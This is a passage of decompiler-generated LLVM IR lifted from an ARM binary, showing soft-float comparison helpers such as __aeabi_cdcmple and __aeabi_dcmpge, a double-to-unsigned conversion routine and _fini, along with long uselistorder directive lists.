26, 27, 70, 72, 73, 155, 156, 170, 169, 168, 17 }
  uselistorder label %dec_label_pc_1d4a0, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %..thread3_crit_edge, { 1, 0, 2 }
  uselistorder label %.thread2, { 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_1d440, { 1, 0, 2 }
}

define i32 @__aeabi_cdrcmple() local_unnamed_addr {
entry:
  %v0_1d4a8 = load i32, i32* @r0, align 4
  %v0_1d4ac = load i32, i32* @r2, align 4
  store i32 %v0_1d4ac, i32* @r0, align 4
  store i32 %v0_1d4a8, i32* @r2, align 4
  %v0_1d4c0 = call i32 @__aeabi_cdcmple()
  ret i32 %v0_1d4c0
}

define i32 @__aeabi_cdcmple() local_unnamed_addr {
entry:
  %v3_1d4c4 = load i32, i32* @r0, align 4
  %v1_1d4c8 = sext i32 %v3_1d4c4 to i64
  %v2_1d4c8 = bitcast i64 %v1_1d4c8 to double
  %v3_1d4c8 = load i32, i32* @r2, align 4
  %v4_1d4c8 = sext i32 %v3_1d4c8 to i64
  %v5_1d4c8 = bitcast i64 %v4_1d4c8 to double
  %v7_1d4c8 = fcmp oeq double %v2_1d4c8, %v5_1d4c8
  store i1 true, i1* @cpsr_c, align 1
  %not.v6_1d4c8 = fcmp ule double %v2_1d4c8, %v5_1d4c8
  %not.v7_1d4c8 = xor i1 %v7_1d4c8, true
  %v1_1d4cc = and i1 %not.v6_1d4c8, %not.v7_1d4c8
  store i1 %v7_1d4c8, i1* @cpsr_z, align 1
  br i1 %v1_1d4cc, label %bb, label %bb3

bb:                                               ; preds = %entry
  store i1 false, i1* @cpsr_c, align 1
  store i1 %v7_1d4c8, i1* @cpsr_z, align 1
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  ret i32 %v3_1d4c4

; uselistorder directives
  uselistorder i1 %v7_1d4c8, { 1, 2, 0 }
  uselistorder i32* @r2, { 14, 41, 42, 43, 44, 3, 45, 46, 47, 48, 49, 50, 11, 51, 108, 109, 113, 12, 115, 116, 117, 118, 119, 127, 134, 135, 136, 137, 138, 139, 18, 140, 141, 142, 52, 53, 21, 114, 19, 20, 112, 143, 144, 145, 13, 90, 10, 163, 164, 165, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 152, 64, 65, 66, 67, 110, 111, 166, 170, 171, 172, 173, 2, 176, 120, 121, 122, 123, 124, 4, 167, 5, 6, 125, 126, 7, 8, 85, 86, 0, 87, 153, 129, 68, 69, 70, 71, 91, 101, 128, 1, 174, 9, 175, 72, 73, 74, 76, 75, 77, 78, 79, 80, 130, 131, 132, 81, 82, 133, 168, 169, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 83, 84, 88, 89, 92, 93, 94, 95, 96, 97, 98, 99, 100, 102, 103, 15, 16, 17, 104, 105, 106, 107, 146, 147, 148, 149, 150, 151, 154, 155, 156, 157, 158, 159, 160, 161, 162 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__aeabi_dcmpeq(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v0_1d4e0 = call i32 @__aeabi_cdcmple()
  %v0_1d4e4 = load i1, i1* @cpsr_z, align 1
  %.v0_1d4e0. = zext i1 %v0_1d4e4 to i32
  ret i32 %.v0_1d4e0.
}

define i32 @__aeabi_dcmplt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_1d4f8 = call i32 @__aeabi_cdcmple()
  %v0_1d4fc = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_1d4fc to i32
  %.v0_1d4f8. = xor i32 %tmp2, 1
  ret i32 %.v0_1d4f8.
}

define i32 @__aeabi_dcmple() local_unnamed_addr {
entry:
  %v0_1d510 = call i32 @__aeabi_cdcmple()
  %v0_1d514 = load i1, i1* @cpsr_z, align 1
  %v1_1d514 = load i1, i1* @cpsr_c, align 1
  %v2_1d514 = xor i1 %v1_1d514, true
  %v3_1d514 = or i1 %v0_1d514, %v2_1d514
  %.v0_1d510 = select i1 %v3_1d514, i32 1, i32 %v0_1d510
  %v2_1d518 = xor i1 %v0_1d514, true
  %v3_1d518 = and i1 %v1_1d514, %v2_1d518
  %..v0_1d510 = select i1 %v3_1d518, i32 0, i32 %.v0_1d510
  ret i32 %..v0_1d510

; uselistorder directives
  uselistorder i1 %v1_1d514, { 1, 0 }
  uselistorder i32 ()* @__aeabi_cdcmple, { 2, 1, 0, 3 }
}

define i32 @__aeabi_dcmpge(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_1d524 = load i32, i32* @lr, align 4
  store i32 %v0_1d524, i32* %stack_var_-8, align 4
  %v0_1d528 = call i32 @__aeabi_cdrcmple()
  %v0_1d52c = load i1, i1* @cpsr_z, align 1
  %v1_1d52c = load i1, i1* @cpsr_c, align 1
  %v2_1d52c = xor i1 %v1_1d52c, true
  %v3_1d52c = or i1 %v0_1d52c, %v2_1d52c
  %.v0_1d528 = select i1 %v3_1d52c, i32 1, i32 %v0_1d528
  %v2_1d530 = xor i1 %v0_1d52c, true
  %v3_1d530 = and i1 %v1_1d52c, %v2_1d530
  %..v0_1d528 = select i1 %v3_1d530, i32 0, i32 %.v0_1d528
  %v2_1d534 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1d534, i32* @lr, align 4
  ret i32 %..v0_1d528

; uselistorder directives
  uselistorder i1 %v1_1d52c, { 1, 0 }
  uselistorder i1 true, { 3, 4, 5, 6, 0, 103, 1, 94, 7, 8, 9, 10, 11, 12, 86, 87, 95, 96, 88, 13, 14, 15, 89, 90, 91, 97, 16, 17, 18, 19, 22, 21, 20, 105, 106, 107, 108, 109, 110, 111, 92, 112, 113, 114, 99, 115, 116, 117, 118, 93, 119, 120, 121, 122, 123, 124, 125, 23, 126, 104, 127, 24, 25, 26, 27, 100, 30, 31, 32, 33, 28, 29, 101, 34, 102, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 98, 128, 64, 65, 66, 67, 2, 68, 69, 84, 70, 71, 72, 73, 85, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83 }
  uselistorder i1* @cpsr_z, { 30, 29, 31, 32, 33, 34, 35, 36, 37, 38, 0, 1, 2, 3, 4, 5, 6, 7, 44, 8, 9, 10, 11, 12, 13, 14, 15, 40, 41, 42, 43, 16, 17, 18, 19, 39, 20, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder i32* @lr, { 20, 21, 22, 23, 24, 7, 8, 9, 10, 11, 25, 0, 26, 1, 27, 28, 29, 56, 57, 61, 62, 63, 67, 68, 69, 70, 71, 72, 73, 74, 77, 87, 88, 81, 89, 90, 91, 92, 93, 94, 95, 96, 12, 97, 98, 99, 107, 100, 101, 102, 103, 104, 105, 106, 30, 64, 65, 66, 52, 133, 134, 135, 136, 137, 138, 139, 140, 141, 82, 83, 58, 59, 60, 31, 32, 33, 34, 35, 36, 37, 38, 39, 55, 13, 14, 112, 113, 114, 50, 51, 53, 54, 110, 142, 143, 115, 116, 117, 118, 119, 78, 79, 80, 120, 121, 122, 123, 124, 125, 126, 2, 127, 128, 130, 131, 129, 108, 109, 16, 17, 18, 84, 85, 86, 40, 41, 42, 43, 44, 45, 3, 4, 46, 47, 48, 49, 19, 15, 75, 76, 111, 132, 5, 6 }
}

define i32 @__aeabi_dcmpgt() local_unnamed_addr {
entry:
  %v0_1d540 = call i32 @__aeabi_cdrcmple()
  %v0_1d544 = load i1, i1* @cpsr_c, align 1
  %tmp2 = zext i1 %v0_1d544 to i32
  %.v0_1d540. = xor i32 %tmp2, 1
  ret i32 %.v0_1d540.

; uselistorder directives
  uselistorder i32 1, { 582, 595, 700, 596, 583, 1082, 1040, 1083, 701, 244, 247, 246, 249, 248, 245, 251, 250, 1084, 702, 1085, 703, 16, 18, 14, 15, 17, 398, 243, 242, 552, 138, 704, 459, 460, 1086, 1087, 172, 171, 1088, 455, 456, 457, 705, 240, 241, 236, 237, 238, 239, 1167, 507, 1168, 1174, 606, 1175, 1176, 706, 144, 145, 146, 143, 149, 147, 148, 707, 335, 334, 1177, 607, 608, 1180, 1194, 710, 709, 708, 463, 462, 464, 461, 1196, 711, 141, 142, 1197, 553, 1198, 1199, 712, 311, 312, 1200, 713, 140, 302, 301, 263, 1201, 715, 714, 296, 295, 294, 716, 297, 609, 1202, 1203, 1204, 524, 1205, 589, 554, 1206, 1207, 527, 1208, 1209, 719, 718, 717, 468, 466, 467, 465, 720, 471, 470, 469, 1210, 1211, 1212, 1221, 1222, 1223, 1230, 610, 611, 729, 728, 727, 726, 699, 725, 724, 723, 722, 721, 473, 474, 476, 475, 477, 472, 1233, 730, 194, 192, 193, 195, 584, 1258, 1259, 577, 1260, 1262, 508, 1263, 613, 573, 572, 612, 1264, 519, 536, 570, 590, 1265, 1266, 1267, 1268, 1269, 0, 1270, 1261, 614, 1271, 579, 738, 690, 737, 736, 735, 734, 733, 732, 731, 175, 176, 173, 174, 1272, 1273, 1274, 1275, 1276, 509, 1277, 739, 256, 259, 255, 253, 252, 254, 257, 258, 1041, 1042, 1043, 1044, 1045, 1046, 1047, 1048, 555, 1049, 1050, 743, 742, 741, 740, 271, 272, 273, 274, 1051, 1052, 1053, 1054, 1055, 746, 745, 744, 281, 276, 280, 283, 279, 278, 277, 275, 284, 282, 556, 1278, 557, 1279, 1280, 1281, 1282, 1, 1283, 1284, 1285, 1286, 1287, 1288, 748, 747, 157, 156, 159, 160, 155, 161, 158, 597, 1289, 1290, 1291, 1292, 1293, 749, 226, 225, 227, 228, 224, 1234, 750, 478, 479, 480, 751, 285, 752, 200, 201, 202, 203, 753, 49, 48, 50, 1089, 1090, 1091, 754, 483, 485, 484, 481, 482, 755, 53, 54, 51, 57, 55, 52, 56, 60, 65, 59, 64, 68, 67, 63, 66, 61, 62, 756, 37, 36, 34, 33, 35, 31, 32, 757, 38, 39, 46, 47, 43, 44, 42, 45, 40, 41, 486, 230, 229, 287, 286, 558, 1294, 1295, 1314, 1315, 759, 758, 19, 21, 22, 20, 528, 578, 529, 1357, 1358, 1359, 1360, 559, 760, 13, 1154, 1155, 11, 12, 537, 1181, 1426, 1182, 1183, 1184, 538, 1156, 1186, 1185, 515, 761, 1157, 762, 488, 489, 490, 487, 1092, 539, 1093, 1428, 540, 1429, 1430, 1431, 1432, 1433, 1434, 1025, 1435, 1436, 1437, 1438, 1439, 1440, 1026, 691, 764, 763, 76, 77, 82, 84, 83, 78, 75, 79, 81, 80, 615, 1235, 1236, 1242, 1243, 765, 692, 127, 128, 1187, 1188, 766, 326, 325, 541, 560, 1094, 1095, 1096, 616, 1097, 525, 561, 520, 542, 1098, 617, 1099, 1100, 1101, 2, 1102, 513, 1103, 510, 1104, 618, 1105, 1106, 1107, 562, 1108, 779, 778, 777, 776, 775, 774, 773, 772, 771, 770, 769, 768, 693, 767, 493, 502, 492, 494, 505, 497, 495, 498, 496, 503, 504, 500, 499, 501, 506, 1333, 1334, 99, 97, 102, 104, 100, 101, 98, 103, 23, 521, 780, 24, 25, 781, 10, 1237, 1238, 1239, 782, 166, 168, 167, 169, 163, 162, 164, 165, 1109, 784, 783, 69, 71, 70, 72, 74, 73, 563, 591, 787, 786, 785, 619, 1195, 788, 330, 1189, 1190, 1191, 1192, 1193, 620, 789, 109, 112, 110, 111, 113, 621, 114, 1056, 790, 394, 622, 791, 393, 623, 792, 300, 298, 299, 793, 235, 234, 233, 794, 307, 306, 313, 795, 395, 796, 305, 304, 797, 329, 327, 328, 798, 216, 799, 218, 217, 800, 491, 801, 219, 802, 220, 803, 804, 221, 222, 564, 624, 625, 626, 627, 1147, 805, 223, 1441, 628, 1442, 1443, 629, 806, 387, 383, 388, 386, 384, 389, 390, 385, 382, 630, 178, 177, 807, 400, 401, 402, 204, 808, 1370, 1371, 811, 810, 809, 134, 132, 522, 1037, 1038, 1039, 812, 1148, 815, 814, 813, 131, 816, 530, 1216, 531, 1217, 1218, 523, 1219, 404, 405, 403, 406, 408, 407, 409, 1220, 532, 1057, 354, 357, 356, 355, 358, 1169, 565, 1170, 818, 817, 362, 360, 359, 366, 364, 365, 363, 361, 819, 344, 346, 342, 340, 341, 343, 345, 820, 347, 352, 348, 351, 350, 353, 349, 821, 822, 1444, 566, 631, 824, 823, 825, 1374, 1377, 1378, 1379, 826, 435, 440, 441, 439, 438, 442, 436, 437, 1380, 1381, 1382, 1383, 827, 446, 452, 445, 451, 450, 444, 454, 453, 448, 443, 447, 449, 1375, 1376, 632, 828, 266, 268, 267, 1224, 633, 1225, 1226, 1227, 1228, 1229, 829, 86, 87, 85, 88, 1384, 1385, 1386, 1387, 1388, 1389, 585, 1390, 1391, 1392, 1393, 1394, 1395, 1396, 1397, 635, 1398, 1399, 1400, 1401, 1402, 634, 1403, 1404, 1405, 1406, 1407, 830, 372, 374, 370, 373, 378, 380, 377, 379, 381, 375, 376, 371, 337, 336, 636, 637, 526, 834, 833, 832, 831, 89, 543, 205, 835, 339, 338, 397, 836, 399, 837, 139, 838, 133, 130, 839, 191, 190, 840, 310, 841, 842, 1335, 1336, 410, 844, 843, 411, 412, 1249, 845, 1326, 1327, 3, 115, 1110, 1111, 846, 413, 1178, 1179, 544, 1427, 1296, 1297, 1298, 1299, 1300, 1301, 1302, 1303, 1304, 1305, 1306, 1307, 1308, 1309, 1310, 1311, 1312, 1313, 847, 209, 207, 208, 210, 211, 1346, 1347, 28, 29, 1149, 1150, 1151, 1152, 27, 26, 545, 1112, 1348, 1349, 1350, 1351, 1352, 1353, 1354, 170, 1232, 1231, 1027, 1028, 1029, 1030, 1031, 1032, 1033, 1445, 196, 197, 198, 199, 90, 638, 848, 1247, 1244, 1245, 1246, 574, 546, 154, 150, 151, 152, 153, 1241, 849, 185, 187, 188, 189, 186, 639, 1240, 851, 850, 417, 415, 418, 414, 416, 419, 1060, 852, 331, 1248, 853, 214, 213, 212, 1061, 854, 183, 182, 184, 181, 580, 1113, 1114, 641, 1115, 1116, 1117, 1118, 1119, 642, 1120, 1121, 1122, 1123, 1124, 643, 1126, 568, 567, 1125, 640, 1127, 1128, 644, 1129, 1130, 1131, 859, 694, 858, 857, 856, 855, 120, 118, 119, 123, 116, 117, 124, 125, 121, 126, 122, 1132, 860, 421, 425, 423, 424, 420, 422, 547, 861, 292, 291, 1133, 1134, 1135, 107, 108, 105, 106, 581, 514, 1137, 1138, 533, 1139, 1140, 4, 5, 1141, 1143, 516, 1144, 646, 1145, 534, 1142, 645, 871, 870, 869, 868, 867, 866, 865, 864, 863, 862, 91, 93, 92, 647, 548, 872, 94, 95, 96, 1136, 592, 695, 1081, 873, 58, 874, 426, 1058, 875, 318, 317, 319, 321, 320, 316, 322, 648, 1059, 1250, 1251, 1252, 1253, 1254, 1255, 1256, 1257, 549, 878, 877, 876, 428, 427, 431, 430, 429, 432, 569, 880, 879, 881, 1213, 1214, 1215, 883, 882, 135, 136, 884, 324, 323, 885, 206, 369, 886, 290, 887, 433, 888, 180, 179, 232, 231, 315, 314, 889, 270, 269, 890, 264, 891, 892, 289, 288, 893, 265, 293, 894, 434, 260, 895, 896, 262, 261, 897, 303, 898, 309, 308, 511, 1408, 333, 332, 1062, 517, 535, 1063, 1064, 1065, 512, 651, 1066, 1067, 1068, 586, 1069, 1070, 1071, 1072, 1073, 649, 650, 587, 652, 1074, 905, 904, 903, 902, 901, 900, 899, 906, 1075, 1076, 913, 912, 911, 910, 909, 696, 908, 907, 653, 1077, 1078, 915, 914, 654, 1079, 1080, 655, 656, 657, 917, 916, 658, 659, 918, 1146, 660, 923, 922, 921, 920, 919, 926, 925, 924, 1153, 928, 927, 1158, 1159, 661, 934, 933, 932, 931, 930, 929, 215, 1160, 1161, 662, 1162, 1163, 1164, 1165, 940, 939, 938, 937, 936, 935, 367, 1166, 945, 944, 943, 942, 941, 1171, 663, 1034, 1035, 666, 1036, 664, 665, 1024, 1172, 1173, 954, 953, 952, 951, 950, 949, 948, 947, 946, 392, 391, 667, 668, 669, 958, 957, 956, 955, 598, 1316, 959, 962, 961, 960, 6, 670, 575, 964, 963, 1317, 966, 965, 593, 1318, 671, 672, 1320, 1319, 673, 969, 968, 967, 599, 1321, 1322, 674, 675, 676, 1328, 697, 1323, 677, 971, 970, 594, 678, 679, 1324, 680, 1325, 979, 978, 977, 976, 975, 974, 973, 972, 600, 1329, 1330, 601, 980, 981, 1331, 681, 1332, 984, 983, 982, 986, 985, 988, 987, 571, 1337, 1338, 1339, 682, 518, 1340, 1341, 1342, 683, 1343, 992, 991, 990, 989, 698, 1344, 368, 1345, 993, 684, 1355, 996, 995, 994, 1356, 30, 603, 1361, 1362, 602, 1363, 1364, 604, 605, 1365, 1366, 997, 1367, 7, 8, 1369, 1368, 685, 1000, 999, 998, 686, 1372, 1373, 1002, 1001, 1005, 1004, 1003, 1008, 1007, 1006, 1010, 1009, 1409, 1410, 687, 1419, 1420, 576, 1421, 1013, 1012, 1011, 588, 9, 1017, 1016, 1015, 1014, 551, 1411, 1412, 1413, 550, 1414, 1417, 1418, 688, 1019, 1018, 689, 1415, 1416, 1021, 1020, 129, 1422, 1423, 137, 1424, 1425, 396, 1022, 1023, 458 }
  uselistorder i1 false, { 38, 14, 15, 12, 16, 51, 52, 53, 54, 55, 56, 9, 10, 13, 57, 58, 59, 11, 39, 36, 40, 41, 42, 43, 44, 4, 17, 18, 37, 2, 31, 60, 0, 22, 23, 24, 45, 19, 21, 46, 47, 48, 49, 50, 33, 3, 6, 61, 20, 25, 28, 27, 26, 29, 7, 8, 1, 30, 5, 35, 32, 34, 62, 63, 64, 65 }
  uselistorder i1* @cpsr_c, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 ()* @__aeabi_cdrcmple, { 1, 0 }
}

define i32 @__fixunsdfsi(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1d554 = icmp slt i32 %arg2, 0
  %v2_1d554 = mul i32 %arg2, 2
  br i1 %v1_1d554, label %dec_label_pc_1d588, label %dec_label_pc_1d55c

dec_label_pc_1d55c:                               ; preds = %entry
  %v1_1d55c = add i32 %v2_1d554, 2097152
  %v2_1d55c = icmp ugt i32 %v2_1d554, -2097153
  br i1 %v2_1d55c, label %dec_label_pc_1d590, label %dec_label_pc_1d564

dec_label_pc_1d564:                               ; preds = %dec_label_pc_1d55c
  %v6_1d55c = icmp slt i32 %v1_1d55c, 0
  br i1 %v6_1d55c, label %dec_label_pc_1d568, label %dec_label_pc_1d588

dec_label_pc_1d568:                               ; preds = %dec_label_pc_1d564
  %v4_1d56c = sdiv i32 %v1_1d55c, 2097152
  %v5_1d56c = sub nsw i32 -993, %v4_1d56c
  %v11_1d56c = icmp slt i32 %v5_1d56c, 0
  br i1 %v11_1d56c, label %dec_label_pc_1d598, label %dec_label_pc_1d574

dec_label_pc_1d574:                               ; preds = %dec_label_pc_1d568
  %v3_1d574 = mul i32 %arg2, 2048
  %v4_1d57c = udiv i32 %arg1, 2097152
  %v1_1d578 = or i32 %v4_1d57c, %v3_1d574
  %v5_1d57c = or i32 %v1_1d578, -2147483648
  %v6_1d580 = lshr i32 %v5_1d57c, %v5_1d56c
  ret i32 %v6_1d580

dec_label_pc_1d588:                               ; preds = %dec_label_pc_1d564, %entry
  ret i32 0

dec_label_pc_1d590:                               ; preds = %dec_label_pc_1d55c
  %v4_1d590 = mul i32 %arg2, 4096
  %v5_1d590 = or i32 %v4_1d590, %arg1
  %v7_1d590 = icmp eq i32 %v5_1d590, 0
  br i1 %v7_1d590, label %dec_label_pc_1d598, label %dec_label_pc_1d5a0

dec_label_pc_1d598:                               ; preds = %dec_label_pc_1d590, %dec_label_pc_1d568
  ret i32 -1

dec_label_pc_1d5a0:                               ; preds = %dec_label_pc_1d590
  ret i32 0

; uselistorder directives
  uselistorder i32 -1, { 0, 45, 283, 189, 190, 48, 49, 46, 47, 191, 50, 1, 192, 193, 194, 195, 2, 196, 197, 3, 4, 198, 89, 199, 90, 333, 171, 335, 91, 336, 153, 298, 337, 338, 5, 92, 339, 340, 200, 201, 150, 202, 159, 93, 6, 203, 349, 78, 79, 350, 204, 154, 205, 156, 206, 7, 207, 158, 157, 351, 352, 67, 68, 69, 70, 72, 80, 8, 9, 76, 284, 10, 11, 12, 95, 99, 94, 96, 147, 148, 100, 98, 97, 172, 285, 101, 343, 102, 299, 208, 300, 301, 286, 287, 288, 103, 289, 290, 353, 354, 209, 51, 52, 302, 210, 86, 53, 211, 303, 54, 13, 55, 212, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 213, 344, 346, 214, 104, 304, 216, 305, 306, 87, 81, 82, 307, 308, 309, 310, 311, 160, 105, 312, 161, 14, 215, 83, 84, 217, 313, 357, 358, 218, 173, 174, 314, 219, 220, 315, 316, 175, 334, 221, 16, 15, 222, 223, 17, 291, 224, 106, 392, 107, 108, 330, 109, 368, 77, 369, 110, 364, 111, 292, 112, 113, 362, 18, 114, 370, 371, 115, 19, 327, 20, 225, 226, 227, 228, 372, 342, 177, 176, 116, 293, 75, 229, 117, 294, 230, 21, 231, 22, 232, 178, 373, 26, 233, 234, 25, 27, 374, 24, 235, 236, 56, 23, 237, 57, 58, 59, 60, 238, 239, 240, 71, 328, 329, 28, 363, 118, 355, 119, 120, 331, 121, 375, 122, 359, 123, 124, 297, 125, 356, 73, 241, 317, 242, 61, 62, 243, 244, 245, 246, 247, 88, 126, 248, 249, 250, 179, 127, 251, 29, 252, 151, 128, 345, 253, 318, 254, 255, 319, 320, 63, 321, 322, 85, 323, 256, 257, 152, 162, 155, 324, 30, 258, 325, 259, 74, 31, 64, 260, 65, 326, 348, 341, 180, 129, 365, 130, 394, 131, 347, 132, 133, 376, 134, 295, 135, 396, 136, 332, 137, 393, 138, 361, 139, 296, 140, 360, 141, 142, 143, 366, 144, 395, 145, 367, 261, 262, 146, 181, 263, 264, 265, 266, 36, 37, 38, 32, 33, 34, 35, 182, 183, 267, 268, 269, 39, 270, 271, 66, 40, 41, 149, 184, 185, 186, 42, 272, 273, 274, 168, 169, 170, 43, 275, 163, 164, 165, 166, 167, 44, 276, 277, 278, 279, 280, 281, 282, 187, 188 }
  uselistorder i32 4096, { 0, 1, 2, 3, 4, 25, 5, 6, 26, 7, 8, 9, 10, 27, 31, 11, 15, 36, 16, 12, 32, 19, 33, 17, 14, 28, 18, 20, 21, 29, 30, 22, 34, 23, 35, 13, 24 }
  uselistorder i32 -2147483648, { 0, 6, 1, 7, 8, 9, 10, 11, 12, 13, 14, 15, 4, 5, 16, 17, 3, 2, 18, 19, 20, 21 }
  uselistorder i32 2048, { 0, 1, 2, 3, 4, 5, 6, 7, 10, 11, 12, 13, 9, 14, 15, 8 }
  uselistorder i32 2097152, { 8, 9, 15, 0, 1, 2, 10, 11, 3, 4, 5, 12, 13, 14, 6, 7 }
  uselistorder i32 2, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 190, 37, 38, 39, 170, 40, 41, 42, 43, 44, 212, 213, 214, 216, 217, 218, 93, 219, 45, 125, 220, 221, 222, 46, 126, 223, 224, 225, 122, 127, 228, 0, 231, 171, 172, 94, 128, 232, 129, 186, 47, 187, 233, 234, 235, 48, 191, 192, 193, 173, 215, 236, 237, 238, 239, 49, 50, 95, 96, 97, 255, 256, 113, 257, 258, 98, 259, 260, 229, 194, 92, 195, 196, 51, 52, 197, 198, 130, 131, 205, 132, 206, 133, 207, 134, 208, 135, 209, 136, 53, 185, 54, 99, 55, 56, 111, 188, 90, 57, 261, 112, 246, 58, 59, 247, 60, 61, 91, 226, 62, 63, 64, 227, 65, 66, 67, 68, 114, 248, 249, 69, 70, 1, 174, 250, 71, 251, 240, 175, 2, 72, 73, 74, 100, 101, 102, 116, 103, 117, 104, 105, 137, 106, 108, 107, 109, 176, 177, 178, 199, 200, 123, 75, 76, 77, 78, 79, 124, 201, 118, 115, 80, 202, 203, 204, 179, 230, 180, 81, 82, 83, 181, 84, 85, 86, 87, 88, 138, 189, 139, 140, 141, 142, 143, 144, 145, 146, 147, 119, 210, 148, 149, 120, 150, 151, 152, 153, 154, 155, 157, 182, 156, 183, 160, 158, 159, 184, 169, 161, 211, 162, 163, 164, 241, 242, 243, 244, 165, 245, 110, 166, 167, 168, 254, 121, 252, 89, 253 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v3_1d5ac = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_1d5ac)
  %v31_1d5b4 = load i32, i32* @r0, align 4
  ret i32 %v31_1d5b4

; uselistorder directives
  uselistorder i32* @r0, {}
  uselistorder void (i32)* @__pseudo_branch, { 15, 83, 84, 85, 35, 36, 46, 47, 48, 97, 43, 44, 45, 37, 16, 17, 18, 19, 20, 21, 102, 103, 104, 105, 106, 98, 89, 99, 100, 101, 0, 40, 41, 42, 22, 23, 24, 25, 26, 27, 86, 87, 88, 107, 108, 109, 90, 91, 92, 57, 58, 59, 93, 94, 95, 110, 66, 67, 68, 69, 70, 71, 72, 73, 74, 60, 61, 62, 63, 64, 65, 29, 30, 75, 76, 31, 32, 38, 39, 33, 34, 28, 77, 78, 79, 80, 81, 82, 49, 50, 51, 52, 53, 54, 55, 56, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 96 }
  uselistorder i32 0, { 0, 1770, 1, 1771, 1772, 1554, 444, 445, 1773, 1774, 1775, 1776, 1777, 1778, 1779, 3, 4, 5, 1780, 1781, 2, 1782, 1783, 1555, 6, 1784, 1785, 36, 1556, 1786, 1787, 1788, 1789, 1790, 1791, 1792, 1793, 108, 107, 218, 219, 220, 1794, 1795, 1796, 7, 1797, 1798, 37, 1799, 1800, 1801, 38, 39, 210, 1802, 1803, 1804, 1805, 40, 211, 456, 1806, 1807, 1808, 1809, 1810, 1811, 41, 1812, 9, 8, 42, 1557, 1813, 1559, 1558, 1814, 1815, 1816, 1817, 1818, 10, 1615, 1616, 1617, 1618, 1619, 1620, 1621, 1622, 1623, 1624, 1560, 1625, 1819, 1820, 1821, 1822, 1823, 11, 1824, 1561, 1825, 1826, 1827, 1828, 212, 213, 457, 1829, 1830, 13, 12, 1831, 1832, 1833, 1834, 1835, 1836, 1837, 1562, 1563, 1838, 1565, 1839, 1840, 1566, 1567, 1841, 1842, 1564, 1843, 1568, 1844, 1569, 1845, 1846, 1847, 1848, 14, 2074, 2075, 2076, 2077, 136, 2078, 221, 2079, 2080, 2081, 2082, 2083, 2084, 2085, 222, 1570, 1573, 1571, 1572, 2086, 2087, 2088, 2089, 2090, 2091, 2098, 2099, 56, 57, 2108, 2109, 2100, 2101, 2102, 2103, 2104, 2105, 2106, 2107, 2110, 2111, 2118, 2113, 2114, 2116, 2115, 2117, 114, 223, 2141, 2148, 224, 2149, 127, 2150, 128, 2151, 129, 2152, 130, 2153, 225, 2154, 2155, 1849, 1850, 2159, 2160, 226, 2161, 2162, 2163, 227, 2164, 2165, 88, 91, 92, 115, 2166, 89, 2167, 90, 2168, 2169, 2170, 147, 148, 2171, 2172, 2173, 228, 2174, 2175, 392, 2176, 2177, 458, 2178, 2179, 2180, 2181, 2182, 2183, 2184, 93, 2185, 2186, 116, 2201, 2202, 2203, 2204, 2205, 2206, 335, 2207, 2208, 2209, 2219, 2210, 2254, 2274, 2275, 2276, 2218, 149, 2277, 398, 388, 389, 459, 2278, 2279, 2280, 2282, 2283, 2284, 2285, 43, 2286, 2287, 58, 2288, 2289, 2290, 2291, 2294, 2295, 2296, 2297, 2298, 2299, 229, 2300, 2301, 1574, 2302, 2292, 2281, 1575, 332, 1576, 2293, 2303, 2304, 2305, 2306, 59, 2308, 60, 2307, 150, 2309, 2310, 230, 1626, 1627, 1628, 1629, 1630, 117, 1631, 1632, 231, 44, 232, 1633, 460, 1634, 390, 233, 234, 461, 462, 236, 2311, 2312, 2313, 2314, 2315, 237, 235, 463, 464, 2316, 2317, 2318, 2319, 238, 465, 2320, 466, 2321, 61, 62, 63, 64, 446, 239, 2322, 131, 2323, 241, 240, 467, 468, 137, 2220, 2221, 2222, 2223, 2224, 1851, 1852, 1853, 1854, 1855, 1856, 242, 109, 391, 1857, 1858, 1859, 94, 2225, 469, 2226, 2227, 2228, 151, 1860, 470, 1861, 1862, 1863, 1864, 1865, 1866, 399, 400, 1637, 1638, 2156, 2157, 401, 2158, 471, 1635, 472, 1636, 1644, 1645, 15, 152, 153, 251, 243, 250, 247, 246, 245, 244, 252, 249, 248, 2142, 2143, 2144, 2145, 473, 2324, 2325, 2326, 253, 2327, 2331, 2332, 2333, 2334, 2335, 254, 2336, 154, 2385, 2386, 2387, 2388, 255, 256, 2389, 2119, 2120, 2121, 336, 2486, 95, 337, 2490, 2491, 123, 65, 155, 1577, 1867, 66, 156, 1868, 1869, 338, 2044, 2045, 339, 67, 2122, 118, 257, 2046, 2047, 157, 1578, 341, 1870, 68, 124, 1871, 1872, 340, 2492, 2493, 2494, 2495, 2496, 2499, 2500, 2501, 2502, 2503, 2504, 2505, 2506, 2507, 2508, 2497, 2498, 2509, 2510, 2511, 2512, 2513, 2514, 2515, 2516, 45, 2517, 2518, 2519, 2520, 2521, 46, 2522, 2523, 2524, 47, 2525, 2526, 2527, 48, 